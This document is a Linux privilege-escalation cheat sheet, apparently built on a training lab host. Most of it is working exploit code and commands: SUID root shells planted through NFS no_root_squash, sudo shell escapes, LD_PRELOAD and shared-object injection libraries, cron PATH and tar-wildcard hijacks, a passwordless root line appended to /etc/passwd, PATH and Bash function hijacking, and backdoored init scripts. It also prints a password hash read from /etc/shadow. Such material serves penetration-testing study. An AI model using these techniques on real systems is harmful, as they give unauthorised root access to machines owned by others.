###################################
Linux Privilege Escalation Examples
###################################

NFS
===

NFS allows a host to share file system resources over a network. Access Control is based on the server's file system, and on the uid/gid provided by the connecting client.

Root squashing maps files owned by root (uid 0) to a different ID (e.g. anonymous or nobody). If the "no_root_squash" option is enabled, files owned by root will not get mapped. This means that as long as you access the NFS share as a root (uid 0) user, you can write to the host file system as root.

.. code-block:: none

    $ cat /etc/exports

    /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

On your local machine, check that the NFS share is accessible:

.. code-block:: none

    # showmount -e 10.0.0.1
    Export list for 10.0.0.1:
    /tmp *

On your local machine, make a directory to mount the remote share, and then mount it:

.. code-block:: none

    # mkdir /tmp/mount
    # mount -o rw,vers=2 10.0.0.1:/tmp /tmp/mount
    # ls /tmp/mount
    backup.tar.gz  useless

Create an executable that calls /bin/bash with root level permissions in the mounted share and set the SUID bit:

.. code-block:: none

    int main() {
        setresuid(0,0,0);
        setresgid(0,0,0);
        system("/bin/bash");
    }

.. code-block:: none

    # gcc -o rootsh rootsh.c
    # cp rootsh /tmp/mount
    # chmod +s /tmp/mount/rootsh

Now, back on the remote host, execute the executable to spawn a root shell:

.. code-block:: none

    $ /tmp/rootsh
    #

Alternatively, on the remote host, copy the /bin/bash or /bin/sh binary to the NFS directory:

.. code-block:: none

    $ cp /bin/bash /tmp

On your local machine, after mounting the NFS share, create new copies of the files (or chown them to root) and set the SUID/SGUID bits:

.. code-block:: none

    # cp bash rootbash
    # chmod +s rootbash

    OR

    # chown root:root bash
    # chmod +s bash

Now, back on the remote host, run the file. For bash / sh, use the -p command line option to preserve the SUID/SGID (otherwise shell will simply spawn as your own user).

.. code-block:: none

    $ /tmp/rootbash -p
    #

    OR

    $ /tmp/bash -p
    #

Sudo
====

Shell Escape Sequences
----------------------

.. code-block:: none

    $ sudo -l
    Matching Defaults entries for user on this host:
        env_reset, env_keep+=LD_PRELOAD

    User user may run the following commands on this host:
        (root) NOPASSWD: /usr/sbin/iftop
        (root) NOPASSWD: /usr/bin/find
        (root) NOPASSWD: /usr/bin/nano
        (root) NOPASSWD: /usr/bin/vim
        (root) NOPASSWD: /usr/bin/man
        (root) NOPASSWD: /usr/bin/awk
        (root) NOPASSWD: /usr/bin/less
        (root) NOPASSWD: /usr/bin/ftp
        (root) NOPASSWD: /usr/bin/nmap
        (root) NOPASSWD: /usr/sbin/apache2
        (root) NOPASSWD: /bin/more

vim / vi
^^^^^^^^

.. code-block:: none

    $ sudo vim --cmd sh
    #

    $ sudo vi --cmd sh
    #

.. code-block:: none

    $ sudo vim -c sh
    #

    $ sudo vi -c sh
    #

.. code-block:: none

    $ sudo vim
    :!sh
    #

    $ sudo vi
    :!sh
    #

man
^^^

.. code-block:: none

    $ sudo man ls
    !sh
    #

less
^^^^

.. code-block:: none

    $ sudo less /path/to/large/file
    !sh
    #

more
^^^^

.. code-block:: none

    $ sudo more /path/to/large/file
    !sh
    #

iftop
^^^^^

.. code-block:: none

    $ sudo iftop
    !sh
    #

gdb
^^^

.. code-block:: none

    $ sudo gdb
    (gdb) shell sh
    #

ftp
^^^

.. code-block:: none

    $ ftp
    ftp> !
    #

find
^^^^

.. code-block:: none

    $ sudo find /bin -name ls -exec /bin/sh \;
    #

awk
^^^

.. code-block:: none

    $ sudo awk 'BEGIN {system("/bin/sh")}'
    #

nmap
^^^^

.. code-block:: none

    $ sudo nmap --interactive
    !sh
    #

.. code-block:: none

    $ echo "os.execute('/bin/sh')" > shell.nse
    $ sudo nmap --script=shell.nse
    #

nano
^^^^

.. code-block:: none

    $ sudo nano -s /bin/sh
    sh
    ^T

Abusing Intended Functionality
------------------------------

.. code-block:: none

    $ sudo apache2 -f /etc/shadow
    Syntax error on line 1 of /etc/shadow:
    Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration

LD_PRELOAD / LD_LIBRARY_PATH
----------------------------

Environment variables:

* LD_LIBRARY_PATH - A list of directories in which to search for RLF libraries at execution time.
* LD_PRELOAD - A list of additional, user-specified, ELF shared objects to be loaded before all others.

Sudo has the ability to preserve certain environment variables:

.. code-block:: none

    $ sudo -l
    Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD

Compile a shared object (.so) file:

.. code-block:: none

    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>

    void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        setresgid(0,0,0);
        system("/bin/bash");
    }

.. code-block:: none

    $ gcc -fPIC -shared -nostartfiles -o preload.so preload.c

Set the environment variable as part of the sudo command. The full path to the .so file needs to be used. Your user must be able to run the command via sudo.

.. code-block:: none

    $ sudo LD_PRELOAD=/full/path/tp/preload.so apache2
    #

Cron Jobs
=========

Path
----

If PATH variable defined inside a crontab, and one of the paths is writable, and the cron job doesn't refer to an absolute path, we can exploit.

.. code-block:: none

    $ cat /etc/crontab
    SHELL=/bin/sh
    PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

    * * * * * root overwrite.sh

In the example above, /home/user is in the PATH and our user can write to it.

Create a /home/user/overwrite.sh script which makes a SUID/SGID bit version of bash:

.. code-block:: none

    #!/bin/bash
    cp /bin/bash /tmp/rootbash
    chmod +s /tmp/rootbash

Make the script executable:

.. code-block:: none

    $ chmod +x /home/user/overwrite.sh

Now wait for the cron job to execute. When it does, execute the /tmp/rootbash binary and get a root shell. Remember to use the -p command line option to preserve the SUID/SGID:

.. code-block:: none

    $ /tmp/rootbash -p
    #

Wildcards
---------

If the cron job script contains bash wildcards that reference files, and we can create files in the relevant directory, it may be possible to create files with filenames that can be used as command line flags.

.. code-block:: none

    $ cat /etc/crontab
    ...
    * * * * * root /usr/local/bin/compress.sh

.. code-block:: none

    $ cat /usr/local/bin/compress.sh
    #!/bin/sh
    cd /home/user
    tar czf /tmp/backup.tar.gz *

The tar executable has a checkpoint feature which displays progress messages every specific number of records. It also allows users to define an action that is executed during the checkpoint.

Create a script (runme.sh) which makes a SUID/SGID bit version of bash:

.. code-block:: none

    #!/bin/bash
    cp /bin/bash /tmp/rootbash
    chmod +s /tmp/rootbash

Make the script executable:

.. code-block:: none

    $ chmod +x runme.sh

Create two files in the directory that the tar command is run in, with the filename set to the full command line options:

.. code-block:: none

    touch /home/user/--checkpoint=1
    touch /home/user/--checkpoint-action=exec=sh\ runme.sh

Now wait for the cron job to execute. When it does, execute the /tmp/rootbash binary and get a root shell. Remember to use the -p command line option to preserve the SUID/SGID:

.. code-block:: none

    $ /tmp/rootbash -p
    #

File Overwrite
--------------

If a cron job script is writable, we can modify it and run commands as root:

.. code-block:: none

    $ cat /etc/crontab
    ...
    * * * * * root overwrite.sh

.. code-block:: none

    $ locate overwrite.sh
    /usr/local/bin/overwrite.sh
    $ ls -l /usr/local/bin/overwrite.sh
    -rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh

The /usr/local/bin/overwrite.sh file is world-writable.

Overwrite the /usr/local/bin/overwrite.sh script with one that makes a SUID/SGID bit version of bash:

.. code-block:: none

    #!/bin/bash
    cp /bin/bash /tmp/rootbash
    chmod +s /tmp/rootbash

Now wait for the cron job to execute. When it does, execute the /tmp/rootbash binary and get a root shell. Remember to use the -p command line option to preserve the SUID/SGID:

.. code-block:: none

    $ /tmp/rootbash -p
    #

File Permissions
================

Writable /etc/passwd
--------------------

On some \*nix distributions, if /etc/passwd is writable, we can add a new root user with no password, since the only thing that matters is the uid being 0:

.. code-block:: none

    $ echo newroot::0:0:root:/root:/bin/bash >> /etc/passwd

Now use su to switch user:

.. code-block:: none

    $ su newroot
    #

SUID Binaries
-------------

Shared Object Injection
^^^^^^^^^^^^^^^^^^^^^^^

Shared Objects (.so) are the \*nix equivalent of Windows DLLs. If a program references a shared object that we can write to (even if it doesn't exist) we can run commands with the user context of the application.

Find SUID/SGID binaries:

.. code-block:: none

    $ find / -type f -a \( -perm -u+s -o -perm -u+s \) -exec ls -l {} \; 2> /dev/null
    -rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
    -rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
    -rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
    -rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
    -rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
    -rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
    -rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
    -rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
    -rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
    -rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
    -rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
    -rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
    -rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
    -rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
    -rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
    -rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
    -rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
    -rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
    -rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
    -rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
    -rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
    -rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
    -rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
    -rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
    -rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
    -rwsr-sr-x 1 root root 16664 Feb  9 13:43 /tmp/rootsh
    -rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
    -rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs

Use strace to find references to shared objects:

.. code-block:: none

    $ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
    access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
    open("/etc/ld.so.cache", O_RDONLY)      = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/lib/libdl.so.2", O_RDONLY)       = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/lib/libm.so.6", O_RDONLY)        = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/lib/libc.so.6", O_RDONLY)        = 3
    open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)

The shared object /home/user/.config/libcalc.so is referenced, but it doesn't exist. Luckily it is in a writable directory.

Create a C program (libcalc.c) and compile it to a shared object:

.. code-block:: none

    #include <stdio.h>
    #include <stdlib.h>

    static void inject() __attribute__((constructor));
    void inject() {
        setresuid(0,0,0);
        setresgid(0,0,0);
        system("/bin/bash");
    }

.. code-block:: none

    $ gcc -shared -fPIC -o libcalc.so libcalc.c

Move the libcalc.so shared object to the path referenced by the SUID binary:

.. code-block:: none

    $ mkdir -p /home/user/.config
    $ cp libcalc.so /home/user/.config/libcalc.so

Now run the SUID binary, it should give you a root shell immediately:

.. code-block:: none

    $ suid-so
    Calculating something, please wait...
    root@debian:~# 

Symlink
^^^^^^^

TODO

Environment Variables - Relative Paths
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Find SUID/SGID binaries:

.. code-block:: none

    $ find / -type f -a \( -perm -u+s -o -perm -u+s \) -exec ls -l {} \; 2> /dev/null
    -rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
    -rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
    -rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
    -rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
    -rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
    -rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
    -rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
    -rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
    -rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
    -rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
    -rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
    -rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
    -rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
    -rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
    -rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
    -rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
    -rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
    -rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
    -rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
    -rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
    -rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
    -rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
    -rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
    -rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
    -rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
    -rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
    -rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs

Use strings to find any strings in the executable, especially system commands:

.. code-block:: none

    $ strings /usr/local/bin/suid-env
    /lib64/ld-linux-x86-64.so.2
    5q;Xq
    __gmon_start__
    libc.so.6
    setresgid
    setresuid
    system
    __libc_start_main
    GLIBC_2.2.5
    fff.
    fffff.
    l$ L
    t$(L
    |$0H
    service apache2 start

The "service" command doesn't have an absolute path. When it is called, \*nix will try to find it by traversing the PATH environment variable. We can modify the PATH variable and create a malicious version of the service binary which will spawn a root shell when it is run.

First create a C program (service.c):

.. code-block:: none

    int main() {
        setresuid(0,0,0);
        setresgid(0,0,0);
        system("/bin/bash");
    }

Compile it to our malicious binary:

.. code-block:: none

    $ gcc -o /tmp/service service.c

Add /tmp to the start of the PATH environment variable and export it:

.. code-block:: none

    $ export PATH=/tmp:$PATH

Now run the original SUID/SGID binary. A root shell should spawn:

.. code-block:: none

    $ /usr/local/bin/suid-env
    #

Environment Variables - Absolute Paths
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Find SUID/SGID binaries:

.. code-block:: none

    $ find / -type f -a \( -perm -u+s -o -perm -u+s \) -exec ls -l {} \; 2> /dev/null
    -rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
    -rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
    -rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
    -rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
    -rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
    -rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
    -rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
    -rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
    -rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
    -rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
    -rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
    -rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
    -rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
    -rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
    -rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
    -rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
    -rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
    -rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
    -rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
    -rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
    -rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
    -rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
    -rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
    -rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
    -rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
    -rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
    -rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs

Use strings to find any strings in the executable, especially system commands:

.. code-block:: none

    $ strings /usr/local/bin/suid-env2
    /lib64/ld-linux-x86-64.so.2
    __gmon_start__
    libc.so.6
    setresgid
    setresuid
    system
    __libc_start_main
    GLIBC_2.2.5
    fff.
    fffff.
    l$ L
    t$(L
    |$0H
    /usr/sbin/service apache2 start

The /usr/sbin/service command seems to be interesting, however it has an absolute path and cannot be edited.

Some versions of Bash (<4.2-048) and Dash let you define functions with the same name as an absolute path. These then take precedent above the actual executable themselves.

Define a bash function "/usr/sbin/service" that creates an SUID/SGID version of bash:

.. code-block:: none

    $ function /usr/sbin/service() { cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p;}

Export the new function:

.. code-block:: none

    $ export -f /usr/sbin/service

Now run the original SUID/SGID binary. A root shell should spawn:

.. code-block:: none

    $ /usr/local/bin/suid-env2
    #

Bash also supports a script debugging mode, and uses the PS4 environment variable to define a prompt for the debugging mode.

We can get an instance root shell:

.. code-block:: none

    env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod +s /tmp/rootbash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/rootbash -p'

Startup Scripts
---------------

Startup scripts are stored under /etc/init.d, and are usually run with elevated privileges.

Find world-writable startup scripts:

.. code-block:: none

    $ find /etc/init.d -perm -o+w -type f -exec ls -l {} \; 2>/dev/null
    -rwxr-xrwx 1 root root 801 May 14  2017 /etc/init.d/rc.local

Edit the script and add some code that creates an SUID/SGID bash shell:

.. code-block:: none

    cp /bin/bash /tmp/rootbash
    chown root:root /tmp/rootbash
    chmod +s /tmp/rootbash

Now restart the remote host, and once the host is restarted, spawn a root shell:

.. code-block:: none

    $ /tmp/rootbash -p
    #

Configuration Files
-------------------

Configuration files are usually stored in /etc.

Check writable files to see if we can introduce misconfigurations (e.g. if /etc/exports is writable, we can define NFS shares with root squashing turned off).
